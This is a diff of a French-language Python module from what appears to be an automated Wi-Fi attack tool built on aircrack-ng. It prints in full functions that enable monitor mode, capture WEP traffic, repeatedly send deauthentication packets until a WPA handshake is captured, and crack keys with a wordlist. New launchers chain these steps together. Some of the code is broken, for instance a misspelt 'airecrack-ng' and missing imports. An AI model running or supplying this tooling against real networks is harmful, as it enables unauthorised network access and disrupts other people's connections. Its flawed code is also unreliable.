@@ -1,25 +1,30 @@
 import subprocess
 import json
-import re
-import pandas as pd
 from Utils.networkscan import *
+from Utils.wpa_attack import *
+from Utils.wep_attack import *
 from Utils.save_to import *
+
+# Ajout Des Success color
+ERROR_COLOR = "\033[91m"    # Red
+INFO_COLOR = "\033[93m"     # Yellow
+RESET_COLOR = "\033[0m"     # Reset
+SUCCESS_COLOR = "\033[92m"  # Green
 
 # Exécute une commande système et retourne le résultat.
 def execute_command(command):
     try:
         result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         if result.returncode == 0:
-            print("[SUCCESS]")
+            print(f"{SUCCESS_COLOR}[SUCCESS]{RESET_COLOR}")
             print(result.stdout)
         else:
-            print("[ERROR]")
+            print(f"{ERROR_COLOR}[ERROR]{RESET_COLOR}")
             print(result.stdout)
         return result.stdout
     except Exception as e:
-        print(f"[EXCEPTION]: {e}")
+        print(f"{ERROR_COLOR}[EXCEPTION]: {e}{RESET_COLOR}")
         return str(e)
-    
 
 # Choix de l'attaque
 def choix_attaque():
@@ -32,21 +37,19 @@ def choix_attaque():
         choix = input("Entrez le numéro de l'attaque (1/2/3): ")
 
         if choix == "1":
-            print("[SUCCESS]: Vous avez choisi l'attaque WEP.\n")
+            print(f"{SUCCESS_COLOR}[SUCCESS] : Vous avez choisi l'attaque WEP.{RESET_COLOR}\n")
             break
         elif choix == "2":
-            print("[SUCCESS]: Vous avez choisi l'attaque WPA.\n")
+            print(f"{SUCCESS_COLOR}[SUCCESS] : Vous avez choisi l'attaque WPA.{RESET_COLOR}\n")
             break
         elif choix == "3":
-            print("[SUCCESS]: Vous avez choisi l'attaque WPS.\n")
+            print(f"{SUCCESS_COLOR}[SUCCESS] : Vous avez choisi l'attaque WPS.{RESET_COLOR}\n")
             break
         else:
-            print("[ERROR] : Choix invalide. Veuillez sélectionner 1, 2 ou 3.\n")
-
+            print(f"{ERROR_COLOR}[ERROR] : Choix invalide. Veuillez sélectionner 1, 2 ou 3.{RESET_COLOR}\n")
 
 # Choix de l'Interface   
 def choix_network_interface():
-
     try:
         # Liste les interfaces réseau
         result = subprocess.run(['ip', 'link', 'show'], stdout=subprocess.PIPE, text=True)
@@ -61,70 +64,64 @@ def choix_network_interface():
                 interfaces.append(interface_name)
 
         # Affiche les interfaces détectées
-        print("Quel Interface souhaites tu utiliser :")
+        print("Choisissez l'interface réseau à utiliser :")
         for i, interface in enumerate(interfaces, start=1):
             print(f"{i}. {interface}")
 
         # Choix de l'Interface
         while True:
             try:
-                choice = int(input("\nChoisissez une interface par son numéro : "))
+                choice = int(input("\nEntrez le numéro de l'interface : "))
                 if 1 <= choice <= len(interfaces):
                     selected_interface = interfaces[choice - 1]
-                    print(f"\n[SUCCESS]: Interface sélectionnée : {selected_interface} \n")
+                    print(f"\n{SUCCESS_COLOR}[SUCCESS] : Interface sélectionnée : {selected_interface}{RESET_COLOR}\n")
                     return selected_interface
                 else:
-                    print("Veuillez entrer un numéro valide.")
+                    print(f"{ERROR_COLOR}[ERROR] : Veuillez entrer un numéro valide.{RESET_COLOR}")
             except ValueError:
-                print("Veuillez entrer un nombre valide.")
+                print(f"{ERROR_COLOR}[ERROR] : Veuillez entrer un nombre valide.{RESET_COLOR}")
 
     except FileNotFoundError:
-        print("La commande 'ip' n'est pas disponible sur ce système.")
+        print(f"{ERROR_COLOR}[ERROR] : La commande 'ip' n'est pas disponible sur ce système.{RESET_COLOR}")
     except Exception as e:
-        print(f"Erreur : {e}")
-
+        print(f"{ERROR_COLOR}[ERROR] : Une erreur s'est produite : {e}{RESET_COLOR}")
 
 # Kill les process en cours
 def kill_process():
-    
     try:
         # Exécution de la commande airmon-ng check kill
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
-        print("[SUCCESS]: Les processus ont été tués avec succès.")
+        print(f"{SUCCESS_COLOR}[SUCCESS] : Les processus ont été tués avec succès.{RESET_COLOR}")
     except subprocess.CalledProcessError as e:
-        print(f"[ERROR]: Erreur lors de l'exécution de la commande : {e}")
-
+        print(f"{ERROR_COLOR}[ERROR] : Erreur lors de l'exécution de la commande : {e}{RESET_COLOR}")
 
 # Lance le mode monitor sur une interface
 def start_mode_monitor(interface):
-    
     try:
         result = subprocess.run(f"sudo airmon-ng start {interface}", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         if result.returncode == 0:
-            print(f"[SUCCESS]: Mode monitor activé sur {interface}")
+            print(f"{SUCCESS_COLOR}[SUCCESS] : Mode monitor activé sur {interface}{RESET_COLOR}")
             return result.stdout.strip()
         else:
-            print(f"[ERROR]: Impossible d'activer le mode monitor sur {interface}\n{result.stderr}")
+            print(f"{ERROR_COLOR}[ERROR] : Impossible d'activer le mode monitor sur {interface}\n{result.stderr}{RESET_COLOR}")
             return None
     except Exception as e:
-        print(f"[EXCEPTION]: Une erreur s'est produite : {e}")
+        print(f"{ERROR_COLOR}[ERROR] : Une erreur s'est produite : {e}{RESET_COLOR}")
         return None
-    
 
 # Stop le mode monitor sur une interface
 def stop_mode_monitor(interface):
     try:
         result = subprocess.run(f"sudo airmon-ng stop {interface}", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         if result.returncode == 0:
-            print(f"[SUCCESS]: Mode moniteur arrêté sur {interface}")
+            print(f"{SUCCESS_COLOR}[SUCCESS] : Mode monitor arrêté sur {interface}{RESET_COLOR}")
             return result.stdout.strip()
         else:
-            print(f"[ERROR]: Impossible d'arrêter le mode moniteur sur {interface}\n{result.stderr}")
+            print(f"{ERROR_COLOR}[ERROR] : Impossible d'arrêter le mode monitor sur {interface}\n{result.stderr}{RESET_COLOR}")
             return None
     except Exception as e:
-        print(f"[EXCEPTION]: Une erreur s'est produite : {e}")
+        print(f"{ERROR_COLOR}[ERROR] : Une erreur s'est produite : {e}{RESET_COLOR}")
         return None
- 
 
 # Liste les Réseaux Disponible avec leur BSSID et leur channel
 def lister_reseaux(interface, fichier_base="Capture/resultats", duree=20, dossier_json="Json"):
@@ -137,52 +134,17 @@ def lister_reseaux(interface, fichier_base="Capture/resultats", duree=20, dossie
         save_to_json(target, dossier_json="Target", filename="target.json")
         clean_capture_directory()
         clean_result_directory()
-        
     except Exception as e:
-        print(f"[ERREUR] Une erreur s'est produite : {e}")
-      
-        
-#DANS CETTE DEF, JE VEUX lire le  noombre d'iv récolté
-def get_iv_count(csv_file):
-    """
-    Extrait le nombre d'IV (vecteurs d'initialisation) à partir d'un fichier CSV de capture.
-    
-    :param csv_file: Chemin vers le fichier CSV généré par airodump-ng.
-    :return: Le nombre d'IV sous forme d'entier ou None si les données ne sont pas trouvées.
-    """
-    try:
-        with open(csv_file, "r") as file:
-            lines = file.readlines()
-            data_section = False
-            for line in lines:
-                if data_section:
-                    parts = [p.strip() for p in line.split(",")]
-                    if len(parts) > 10 and parts[10].isdigit():
-                        iv_count = int(parts[10])
-                        print(f"Nombre d'IV : {iv_count}")
-                        return iv_count
-                if line.startswith("BSSID"):
-                    data_section = True
-    except FileNotFoundError:
-        print(f"Erreur : Le fichier {csv_file} n'existe pas.")
-    except Exception as e:
-        print(f"Une erreur inattendue s'est produite : {str(e)}")
-    return None
+        print(f"{ERROR_COLOR}[ERROR] : Une erreur s'est produite : {e}{RESET_COLOR}")
 
 
-# Choix de l'attaque en fonction du fichier Target
+# Choisit le type d'attaque en fonction de la sécurité définie dans target.json.
 def choose_attack_type(target_path="Target/target.json"):
-    """
-    Choisit le type d'attaque en fonction de la sécurité définie dans target.json.
-    
-    :param target_path: Chemin vers le fichier target.json contenant les informations réseau.
-    :return: Une chaîne indiquant le type d'attaque (WPA, WEP, WPS)
-    """
     try:
         with open(target_path, "r") as file:
             target_data = json.load(file)
             if not target_data:
-                print("Erreur : Le fichier target.json est vide ou mal formaté.")
+                print(f"{ERROR_COLOR}[ERROR] : Le fichier target.json est vide ou mal formaté.{RESET_COLOR}")
                 return None
             
             security = target_data.get("Security", "").upper()
@@ -196,9 +158,9 @@ def choose_attack_type(target_path="Target/target.json"):
                 attack_type = None
             
             if attack_type:
-                print(f"[SUCCESS] : Type d'attaque sélectionné : {attack_type}")
+                print(f"{SUCCESS_COLOR}[SUCCESS] : Type d'attaque sélectionné : {attack_type}{RESET_COLOR}")
             else:
-                print("[SUCCESS] : Aucun type d'attaque correspondant trouvé.")
+                print(f"{ERROR_COLOR}[ERROR] : Aucun type d'attaque correspondant trouvé.{RESET_COLOR}")
             
             if attack_type == "WPA":
                 print("Lancement de l'attaque WPA... (En cours)")
@@ -210,303 +172,25 @@ def choose_attack_type(target_path="Target/target.json"):
                 print("Lancement de l'attaque WPS... (En cours)")
         
             else:
-                print("Bug... Contact KEKE, il y'a un soucis")
+                print(f"{ERROR_COLOR}[ERROR] : Bug... Contactez KEKE, il y a un souci.{RESET_COLOR}")
             
             return attack_type
-
     except FileNotFoundError:
-        print(f"Erreur : Le fichier {target_path} n'existe pas.")
+        print(f"{ERROR_COLOR}[ERROR] : Le fichier {target_path} n'existe pas.{RESET_COLOR}")
     except json.JSONDecodeError:
-        print(f"Erreur : Le fichier {target_path} n'est pas un JSON valide.")
+        print(f"{ERROR_COLOR}[ERROR] : Le fichier {target_path} n'est pas un JSON valide.{RESET_COLOR}")
     except Exception as e:
-        print(f"Une erreur inattendue s'est produite : {str(e)}")
+        print(f"{ERROR_COLOR}[ERROR] : Une erreur inattendue s'est produite : {str(e)}{RESET_COLOR}")
     return None
 
+# Lance l'attaque WEP en utilisant les différentes étapes définies.
+def wep_launch_attack(interface, target_path="Target/target.json", output_dir="Capture"):
+    capture_from_target_json_wep(interface, target_path, output_dir)
+    crack_password_wep(capture_file=os.path.join(output_dir, "capture-01.cap"))
 
-# Capture les paquets de la Target WEP
-def capture_from_target_json_wep(interface, target_path="Target/target.json", output_dir="Capture"):
-    """
-    Effectue une capture de paquets à partir des informations du fichier target.json.
-    
-    :param interface: Interface réseau à utiliser pour la capture (par exemple, "wlan0mon").
-    :param target_path: Chemin vers le fichier target.json contenant les informations réseau.
-    :param output_dir: Dossier pour enregistrer les fichiers de capture (par défaut "Capture").
-    """
-    
-    try:
-        # Lecture des données du fichier JSON
-        with open(target_path, "r") as file:
-            target_data = json.load(file)
-            if not target_data:
-                print("Erreur : Le fichier target.json est vide ou mal formaté.")
-                return
-
-            # Extraction des informations du réseau
-            bssid = target_data["BSSID"]
-            channel = target_data["Channel"]
-
-            # Commande pour airodump-ng
-            capture_file = os.path.join(output_dir, "capture")
-            # command = ["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", capture_file, interface]
-            
-            # Lancement du processus avec Popen pour permettre l'arrêt
-            process = subprocess.Popen(
-                ["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", capture_file, interface],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )  
-            
-            time.sleep(5)
-                       
-            # Appel la fonction pour récupérer le nombre d'IV
-            get_iv_count("Capture/capture-01.csv")
-            crack_password_wep(capture_file="capture-01.cap", output_file="password.txt")
-                
-            # Arrêt du processus après la capture
-            process.terminate()
-            print("Processus de capture terminé.")
-
-    except FileNotFoundError:
-        print(f"Erreur : Le fichier {target_path} n'existe pas.")
-    except json.JSONDecodeError:
-        print(f"Erreur : Le fichier {target_path} n'est pas un JSON valide.")
-    except Exception as e:
-        print(f"Une erreur inattendue s'est produite : {str(e)}")
-        
-
-# Crack WEP
-def crack_password_wep(capture_file="Capture/capture-01.cap", output_file="password.txt"):
-    """
-    Automatise le cracking du mot de passe avec airecrack-ng pour le WEP
-    et sauvegarde le mot de passe trouvé dans un fichier.
-    
-    :param capture_file: Le fichier de capture contenant les données pour le crack (par défaut "Capture/capture-01.cap").
-    :param output_file: Le fichier où sauvegarder le mot de passe trouvé.
-    """
-    try:
-        while True:
-            command = f"sudo airecrack-ng {capture_file}"
-            result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            if result.returncode == 0:
-                output = result.stdout
-                for line in output.splitlines():
-                    if "KEY FOUND!" in line:
-                        password = line.split()[-1].strip()
-                        with open(output_file, "w") as file:
-                            file.write(f"Mot de passe trouvé : {password}\n")
-                        print(f"[SUCCESS] Mot de passe trouvé : {password}")
-                        print(f"Mot de passe sauvegardé dans : {output_file}")
-                        return
-            
-    except FileNotFoundError:
-        print(f"Erreur : Le fichier {capture_file} n'existe pas.")
-    except Exception as e:
-        print(f"Une erreur inattendue s'est produite : {str(e)}")
-
-
-# Capture les paquets de la Target WPA
-def capture_from_target_json_wpa(interface, target_path="Target/target.json", output_dir="Capture"):
-    """
-    Effectue une capture de paquets à partir des informations du fichier target.json.
-    
-    :param interface: Interface réseau à utiliser pour la capture (par exemple, "wlan0mon").
-    :param target_path: Chemin vers le fichier target.json contenant les informations réseau.
-    :param output_dir: Dossier pour enregistrer les fichiers de capture (par défaut "Capture").
-    """
-    
-    try:
-        # Lecture des données du fichier JSON
-        with open(target_path, "r") as file:
-            target_data = json.load(file)
-            if not target_data:
-                print("Erreur : Le fichier target.json est vide ou mal formaté.")
-                return
-
-            # Extraction des informations du réseau
-            bssid = target_data["BSSID"]
-            channel = target_data["Channel"]
-            
-            # Commande pour airodump-ng
-            capture_file = os.path.join(output_dir, "capture_handshake")
-            # command = ["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", capture_file, interface]
-            
-            # Lancement du processus avec Popen pour permettre l'arrêt
-            process = subprocess.Popen(
-                ["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", capture_file, interface],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )  
-            
-            print("Attente de 5 Secondes avant le lancement des paquets de desauthentification")
-            time.sleep(5)
-                       
-            # Launch Paquet de Desauth vers tous ses appareils - Es ce que le Handshake a été capturé ? Si oui, passé a l'étape suivante
-            monitor_for_handshake_and_attack(bssid, interface)
-            
-                
-            # Arrêt du processus après la capture
-            process.terminate()
-            print("Processus de capture terminé.")
-            
-    except FileNotFoundError:
-        print(f"Erreur : Le fichier {target_path} n'existe pas.")
-    except json.JSONDecodeError:
-        print(f"Erreur : Le fichier {target_path} n'est pas un JSON valide.")
-    except Exception as e:
-        print(f"Une erreur inattendue s'est produite : {str(e)}")
-        
-        
-# Deauth Attacks
-def execute_deauth_attack(bssid, interface, packets=10):
-    """
-    Exécute une attaque de désauthentification sur le réseau Wi-Fi cible.
-    
-    Parameters:
-    - bssid (str): L'adresse MAC du point d'accès cible.
-    - interface (str): L'interface réseau en mode moniteur.
-    - packets (int): Nombre de paquets de désauthentification à envoyer (par défaut 30).
-    """
-    try:
-        command = f"sudo aireplay-ng --deauth {packets} -a {bssid} {interface}"
-        result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        if result.returncode == 0:
-            print(f"[SUCCESS]: Attaque de désauthentification lancée sur {bssid} via {interface}.")
-            print(result.stdout)
-        else:
-            print(f"[ERROR]: Une erreur s'est produite lors de l'attaque.\n{result.stderr}")
-    except Exception as e:
-        print(f"[EXCEPTION]: Une erreur s'est produite : {e}")
-        
-        
-# Check si un Handshake a été capturé
-def check_handshake(capture_file):
-    """
-    Vérifie si un handshake a été capturé dans le fichier fourni.
-
-    Parameters:
-    - capture_file (str): Le chemin vers le fichier .cap généré par airodump-ng.
-
-    Returns:
-    - bool: True si un handshake est détecté, False sinon.
-    """
-    try:
-        command = f"aircrack-ng {capture_file} -w /dev/null"
-        result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        if "1 handshake" in result.stdout:
-            print(f"[SUCCESS]: 1 Handshake détecté dans {capture_file}.")
-            time.sleep(2)
-            return True
-        else:
-            print(f"[INFO]: Aucun handshake détecté dans {capture_file}.")
-            return False
-    except Exception as e:
-        print(f"[EXCEPTION]: Une erreur s'est produite lors de la vérification : {e}")
-        return False
-    
-    
-# Boucle Desauth Handshake 
-def monitor_for_handshake_and_attack(bssid, interface):
-    """
-    Effectue une boucle qui exécute une attaque de deauth toutes les 30 secondes
-    et vérifie si un handshake a été capturé.
-
-    Parameters:
-    - bssid (str): L'adresse MAC du réseau cible.
-    - interface (str): L'interface réseau à utiliser pour l'attaque.
-    """
-    print("[INFO]: Surveillance du handshake en cours...")
-    while True:
-        execute_deauth_attack(bssid, interface)
-        time.sleep(30)  # Attendre 30 secondes entre chaque tentative
-        
-        if check_handshake("Capture/capture_handshake-01.cap"):
-            print("[SUCCESS]: Handshake capturé avec succès. Passage à l'étape suivante.")
-            time.sleep(2)
-            break
-        else:
-            print("[INFO]: Aucun handshake détecté. Nouvelle tentative...")
-            
-
-# Liste les fichier du Dossier Wordlist      
-def list_and_choose_wordlist(wordlist_dir="Wordlist"):
-    """
-    Liste les fichiers de wordlists disponibles dans le dossier spécifié et permet à l'utilisateur d'en choisir un.
-
-    :param wordlist_dir: Le dossier contenant les fichiers de wordlists (par défaut "Wordlist").
-    :return: Le chemin complet vers la wordlist sélectionnée ou None si aucune sélection.
-    """
-    try:
-        # Vérification si le dossier existe
-        if not os.path.exists(wordlist_dir):
-            print(f"[ERROR]: Le dossier '{wordlist_dir}' n'existe pas.")
-            return None
-        
-        # Récupération des fichiers de wordlists
-        wordlists = [f for f in os.listdir(wordlist_dir) if os.path.isfile(os.path.join(wordlist_dir, f))]
-        if not wordlists:
-            print(f"[INFO]: Aucun fichier de wordlist trouvé dans '{wordlist_dir}'.")
-            return None
-
-        # Affichage des wordlists disponibles
-        print("[INFO]: Wordlists disponibles :")
-        for i, wordlist in enumerate(wordlists, start=1):
-            print(f"{i}. {wordlist}")
-        
-        # Sélection de la wordlist
-        choice = int(input("Entrez le numéro de la wordlist à utiliser : "))
-        if 1 <= choice <= len(wordlists):
-            selected_wordlist = os.path.join(wordlist_dir, wordlists[choice - 1])
-            print(f"[SUCCESS]: Wordlist sélectionnée : {selected_wordlist}")
-            return selected_wordlist
-        else:
-            print("[ERROR]: Choix invalide. Veuillez réessayer.")
-            return None
-    except ValueError:
-        print("[ERROR]: Entrée invalide. Veuillez entrer un numéro valide.")
-    except Exception as e:
-        print(f"[EXCEPTION]: Une erreur s'est produite : {e}")
-    return None
-
-
-# Crack le Handshake
-def crack_handshake_with_wordlist(wordlist_path, capture_file="Capture/capture_handshake-01.cap"):
-    """
-    Tente de cracker un handshake WPA en utilisant une wordlist avec aircrack-ng et affiche la progression.
-    
-    :param wordlist_path: Le chemin vers la wordlist à utiliser.
-    :param capture_file: Le chemin vers le fichier de capture contenant le handshake.
-    """
-    if not wordlist_path:
-        print("[ERROR]: Aucun chemin de wordlist fourni.")
-        return
-
-    try:
-        # Compte le nombre total de mots de passe dans la wordlist pour le suivi du pourcentage
-        with open(wordlist_path, 'r') as file:
-            total_passwords = sum(1 for _ in file)
-        
-        command = f"sudo aircrack-ng -w {wordlist_path} {capture_file}"
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
-        for line in process.stdout:
-            # Affiche les lignes de sortie pour suivre l'état
-            print(line.strip())
-            
-            if "KEY FOUND!" in line:
-                key_match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", line)
-                if key_match:
-                    key = key_match.group(1)
-                    print(f"[SUCCESS]: Clé trouvée ! La clé WPA est : {key}")
-                    process.kill()
-                    return
-
-        process.wait()
-        if process.returncode == 0:
-            print("[INFO]: Tentative de craquage terminée.")
-        else:
-            print(f"[ERROR]: Une erreur s'est produite lors de l'exécution.\n{process.stderr.read()}")
-    except Exception as e:
-        print(f"[EXCEPTION]: Une erreur inattendue s'est produite : {e}")
+# Lance l'attaque WPA en utilisant les différentes étapes définies.
+def wpa_launch_attack(interface, target_path="Target/target.json", output_dir="Capture"):
+    capture_from_target_json_wpa(interface, target_path, output_dir)
+    wordlist_path = list_and_choose_wordlist()
+    if wordlist_path:
+        crack_handshake_with_wordlist(wordlist_path, capture_file=os.path.join(output_dir, "capture_handshake-01.cap"))
